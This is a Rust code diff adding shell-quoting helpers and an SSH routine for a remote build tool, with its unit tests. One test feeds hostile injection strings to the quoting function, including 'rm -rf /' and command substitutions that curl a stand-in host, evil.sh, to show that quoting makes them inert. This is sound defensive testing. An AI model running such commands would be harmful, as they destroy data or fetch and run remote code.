@@ -7,9 +7,14 @@
 //! has already been set up, in `remotes.json`. Later tasks add provisioning
 //! and the shell handoff on top of this.
 
+pub mod identity;
 pub mod store;
 
+use crate::paths::Paths;
+use crate::runner::{CommandOutput, CommandRunner, RunOptions};
+use crate::ui::Failure;
 use anyhow::{Result, anyhow};
+use std::sync::Arc;
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 #[allow(dead_code)] // consumed by Task 21 (`remote::run` builds and stores a Remote)
@@ -106,6 +111,111 @@ impl Remote {
             user,
         })
     }
+}
+
+// Commands a server actually runs.
+//
+// `sshd` hands whatever `ssh` sends it to the login shell configured for
+// that account — `fish`, `csh`, `bash`, whatever the developer chose on
+// that box — and `mosh` skips a shell entirely (`execvp`). So nothing built
+// below may lean on POSIX-only syntax (`VAR=x cmd`, unquoted `~`) that only
+// some of those accept: `shell_quote` makes a value inert regardless of
+// which shell (if any) re-reads it, `shell_command` names the shell
+// explicitly for anything that needs one, and `env_command` sets
+// environment without shell syntax at all. `ssh_once` and `resolve_home`
+// are what put them on the wire.
+
+/// Single-quotes a value for a POSIX shell, so it survives intact as one
+/// argument no matter what characters it contains. The same rule `main.rs`
+/// already uses for `riabuild env`.
+///
+/// Single quotes admit no escape sequences at all — the only character that
+/// needs special handling is the single quote itself, which cannot appear
+/// inside a single-quoted string. The standard trick closes the quote, emits
+/// an escaped literal quote outside it, then reopens: `it's` becomes
+/// `'it'\''s'` — `'it'` + `\'` + `'s'`, concatenated by the shell back into
+/// `it's`.
+pub fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
+/// Wraps a multi-step script so it runs under `/bin/sh`, whatever the
+/// account's login shell happens to be — `fish` and `csh` do not speak
+/// POSIX `sh` syntax, so a script written against it must say so explicitly
+/// rather than rely on whatever the account defaults to.
+pub fn shell_command(script: &str) -> String {
+    format!("/bin/sh -c {}", shell_quote(script))
+}
+
+/// `env K=V … program args…`, with every part quoted.
+///
+/// No shell syntax at all — not even the `sh -c` wrapper `shell_command`
+/// uses — so this is what survives fish and csh (which reject a bare
+/// `VAR=value command` prefix as a syntax error) and mosh (which `execvp`s
+/// the command with no shell to expand or interpret anything).
+#[allow(dead_code)] // consumed by Task 17 (invokes the remote `riabuild` binary)
+pub fn env_command(env: &[(&str, &str)], program: &str, args: &[&str]) -> String {
+    let mut parts = vec!["env".to_string()];
+    for (key, value) in env {
+        parts.push(shell_quote(&format!("{key}={value}")));
+    }
+    parts.push(shell_quote(program));
+    parts.extend(args.iter().map(|arg| shell_quote(arg)));
+    parts.join(" ")
+}
+
+/// One command on the server, through the key riabuild owns for it.
+#[allow(dead_code)] // consumed by Tasks 17, 18, 20, 21
+pub async fn ssh_once(
+    remote: &Remote,
+    paths: &dyn Paths,
+    runner: Arc<dyn CommandRunner>,
+    command: &str,
+) -> Result<CommandOutput> {
+    let mut args = identity::ssh_options(remote, paths, true);
+    args.push(remote.target());
+    args.push(command.to_string());
+    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
+    runner.run("ssh", &refs, &RunOptions::default()).await
+}
+
+/// The server's own home directory, asked for once and kept in
+/// `remotes.json` from then on.
+///
+/// Everything downstream of this uses the absolute string it returns,
+/// never `~`: a `~` is only a home directory to a shell willing to expand
+/// it, mosh runs commands with no shell at all, and an unexpanded `~` that
+/// reached `paths::root_for` would be refused outright rather than
+/// silently collapsing every developer on the box into one namespace.
+#[allow(dead_code)] // consumed by Tasks 17, 18, 20, 21
+pub async fn resolve_home(
+    remote: &Remote,
+    paths: &dyn Paths,
+    runner: Arc<dyn CommandRunner>,
+    store: &mut store::Store,
+) -> Result<String> {
+    if let Some(record) = store.find(&remote.name)
+        && !record.home.is_empty()
+    {
+        return Ok(record.home.clone());
+    }
+
+    let output = ssh_once(remote, paths, runner, &shell_command("printf %s \"$HOME\"")).await?;
+    let home = output.trimmed().to_string();
+    if !output.ok() || !home.starts_with('/') {
+        return Err(Failure::new(
+            format!("asking {} where your home directory is", remote.host),
+            "Check that you can `ssh` to that server yourself, then run `riabuild remote` again.",
+        )
+        .detail(output.stderr)
+        .into());
+    }
+
+    if let Some(record) = store.remotes.iter_mut().find(|r| r.name == remote.name) {
+        record.home = home.clone();
+    }
+    store.save(paths).await?;
+    Ok(home)
 }
 
 #[cfg(test)]
@@ -250,5 +360,82 @@ mod tests {
         assert!(Remote::parse("host:not-a-port", "ada").is_err());
         assert!(Remote::parse("host:0", "ada").is_err());
         assert!(Remote::parse("host:99999", "ada").is_err());
+    }
+
+    fn remote() -> Remote {
+        Remote {
+            name: "build-01".into(),
+            host: "build-01.fly.dev".into(),
+            port: 22,
+            user: "ada".into(),
+        }
+    }
+
+    #[test]
+    fn quoting_makes_a_hostile_value_inert() {
+        assert_eq!(shell_quote("plain"), "'plain'");
+        assert_eq!(shell_quote("with space"), "'with space'");
+        // The one character that ends a single-quoted string, and the reason this
+        // is a function rather than a format string at each call site.
+        assert_eq!(shell_quote("it's"), r"'it'\''s'");
+        assert_eq!(shell_quote("; rm -rf /"), "'; rm -rf /'");
+        assert_eq!(shell_quote("$(curl evil.sh)"), "'$(curl evil.sh)'");
+        assert_eq!(shell_quote("a\nb"), "'a\nb'");
+        // Backticks are the other command-substitution syntax POSIX shells
+        // honour, and single quotes disable them exactly the same way.
+        assert_eq!(shell_quote("`curl evil.sh`"), "'`curl evil.sh`'");
+    }
+
+    #[test]
+    fn a_command_never_depends_on_the_login_shell() {
+        // fish would reject a `VAR=x cmd` prefix outright, and mosh runs the command
+        // with no shell at all, so `env` does the work instead.
+        let command = env_command(
+            &[
+                ("RIABUILD_ROOT", "/home/dev/.riabuild-remote/abc"),
+                ("RIABUILD_REMOTE", "build-01"),
+            ],
+            "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
+            &["--no-shell"],
+        );
+        assert!(command.starts_with("env "), "{command}");
+        assert!(
+            command.contains("'RIABUILD_ROOT=/home/dev/.riabuild-remote/abc'"),
+            "{command}"
+        );
+        assert!(!command.contains('~'), "{command}");
+
+        // Multi-step scripts say which shell runs them.
+        let script = shell_command("mkdir -p /tmp/x && cat > /tmp/x/y");
+        assert!(script.starts_with("/bin/sh -c '"), "{script}");
+    }
+
+    #[tokio::test]
+    async fn the_servers_home_is_asked_for_once_and_remembered() {
+        let home = tempfile::TempDir::new().expect("tempdir");
+        let paths = crate::paths::RealPaths::rooted_at(home.path());
+        let fake =
+            Arc::new(crate::runner::FakeRunner::new().containing("printf", 0, "/home/dev\n", ""));
+        let mut store = store::Store::default();
+        store.remotes.push(store::record_for(&remote()));
+
+        let first = resolve_home(&remote(), &paths, fake.clone(), &mut store)
+            .await
+            .expect("asks");
+        assert_eq!(first, "/home/dev");
+        assert_eq!(store.remotes[0].home, "/home/dev");
+
+        let second = resolve_home(&remote(), &paths, fake.clone(), &mut store)
+            .await
+            .expect("cached");
+        assert_eq!(second, "/home/dev");
+        assert_eq!(
+            fake.calls()
+                .iter()
+                .filter(|call| call.contains("printf"))
+                .count(),
+            1,
+            "the second call must come from remotes.json"
+        );
     }
 }
